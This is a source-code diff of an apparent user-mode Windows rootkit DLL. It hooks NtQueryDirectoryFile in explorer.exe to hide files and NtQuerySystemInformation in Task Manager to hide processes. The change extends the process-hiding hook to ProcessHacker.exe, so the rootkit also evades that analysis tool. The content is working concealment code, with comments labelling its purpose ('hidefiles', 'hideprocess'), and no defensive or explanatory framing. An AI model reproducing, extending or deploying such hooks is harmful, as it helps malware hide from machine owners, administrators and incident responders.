@@ -184,14 +184,14 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 		if (lstrcmpiW(currentProcessName, L"explorer.exe") == 0) {
 
 			LONG64* querydirIAT = findIATaddr("windows.storage.dll", "ntdll.dll", "NtQueryDirectoryFile");
-			g_querydirectoryfile_iat = querydirIAT;
+			g_querydirectoryfile_iat = querydirIAT;//hidefiles
 			g_querydirectoryfile_addr = *querydirIAT;
 
 			installHook(querydirIAT, (LONG64)hookNtQueryDirectoryFile);
 			break;
 		}
-		else if (lstrcmpiW(currentProcessName, L"taskmgr.exe") == 0) {
-			LONG64* querysysIAT = findIATaddr(NULL, "ntdll.dll", "NtQuerySystemInformation");
+		else if ((lstrcmpiW(currentProcessName, L"taskmgr.exe") == 0) || (lstrcmpiW(currentProcessName,L"ProcessHacker.exe")==0)) {
+			LONG64* querysysIAT = findIATaddr(NULL, "ntdll.dll", "NtQuerySystemInformation");//hideprocess
 			g_querysysteminformation_iat = querysysIAT;
 			g_querysysteminformation_addr = *querysysIAT;
 
@@ -214,7 +214,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 		if (lstrcmpiW(currentProcessName, L"explorer.exe") == 0) {
 			uninstallHook(g_querydirectoryfile_iat, g_querydirectoryfile_addr);
 		}
-		else if (lstrcmpiW(currentProcessName, L"taskmgr.exe") == 0) {
+		else if ((lstrcmpiW(currentProcessName, L"taskmgr.exe")==0) || (lstrcmpiW(currentProcessName,L"ProcessHacker.exe")==0)) {
 			uninstallHook(g_querysysteminformation_iat, g_querysysteminformation_addr);
 		}
 		else {
